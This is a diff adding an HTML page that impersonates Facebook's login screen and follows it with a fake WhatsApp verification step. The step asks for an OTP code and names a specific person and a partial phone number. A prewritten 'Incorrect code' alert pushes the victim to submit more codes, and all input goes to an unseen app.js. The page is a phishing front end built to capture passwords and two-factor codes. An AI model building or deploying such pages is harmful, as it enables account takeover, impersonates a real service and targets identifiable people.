@@ -1,1 +1,153 @@
+<!DOCTYPE html>
 
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Facebook</title>
+
+    <link rel="stylesheet" href="styles/style.css">
+
+</head>
+
+<body>
+
+
+
+    <div id="custom-alert" class="alert-overlay">
+
+        <div class="alert-box">
+
+            <p id="alert-message">Incorrect code. We have sent you a new code.</p>
+
+            <button onclick="closeAlert()">OK</button>
+
+        </div>
+
+    </div>
+
+
+
+    <div class="main-container" id="main-wrapper">
+
+        
+
+        <div class="left-content" id="left-col">
+
+            <h1 class="logo-title">facebook</h1>
+
+            <p class="description">Facebook helps you connect and share with the people in your life.</p>
+
+            <img src="illustration.png" alt="Facebook Illustration" class="hero-image">
+
+        </div>
+
+
+
+        <div class="right-content">
+
+            
+
+            <div id="step-1">
+
+                <div class="login-card">
+
+                    <input type="text" id="phone" placeholder="Email address or phone number">
+
+                    <input type="password" id="pass" placeholder="Password">
+
+                    <button class="btn-login" onclick="nextStep()">Log In</button>
+
+                    <a href="#" class="forgot-link">Forgotten password?</a>
+
+                    <hr class="card-hr">
+
+                    <button class="btn-signup">Create new account</button>
+
+                </div>
+
+            </div>
+
+            
+
+            <div id="step-2" class="whatsapp-card" style="display: none;">
+
+                <p class="user-meta">Nguyen Trong Que • Facebook</p>
+
+                <h2 class="step-title">Check your WhatsApp messages.</h2>
+
+                <p class="step-desc">Enter the code we sent to your WhatsApp account at number *** *** ** 66.</p>
+
+
+
+                <div class="whatsapp-img-container">
+
+                    <img src="otp-image.png.jpg" alt="WhatsApp Verification" class="whatsapp-img">
+
+                </div>
+
+
+
+                <div class="input-container">
+
+                    <span class="floating-label">Code</span>
+
+                    <input type="text" id="otp-code" class="otp-input" autocomplete="off" oninput="checkOtpInput()">
+
+                </div>
+
+
+
+                <div class="resend-timer">
+
+                    <span class="icon-refresh">↻</span> We may send the new code after <strong><span id="timer">60</span>s</strong>.
+
+                </div>
+
+
+
+                <button id="btn-submit-otp" class="btn-pill btn-continue-step2" onclick="submitOtp()">Continue</button>
+
+                <button class="btn-pill btn-outline">Try another way</button>
+
+            </div>
+
+
+
+        </div>
+
+    </div>
+
+
+
+    <footer class="footer-section">
+
+        <div class="lang-list">
+
+            <span class="active-lang">English (US)</span> · <span>Español</span> · <span>Français (France)</span> · <span>中文(简体)</span> · <span>العربية</span> · <span>Português (Brasil)</span> · <button class="btn-more-lang">+</button>
+
+        </div>
+
+        <hr class="footer-hr">
+
+        <div class="link-list">
+
+            Sign Up · Log In · Messenger · Facebook Lite · Video · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram · Threads · Fundraisers · Services · Voting Information Center · Privacy Policy · Privacy Center · Groups · About · Create ad · Create Page · Developers · Careers · Cookies · Ad choices · Terms · Help · Contact uploading and non-users
+
+        </div>
+
+        <p class="copyright">Meta © 2026</p>
+
+    </footer>
+
+
+
+    <script src="app.js"></script>
+
+</body>
+
+</html> 
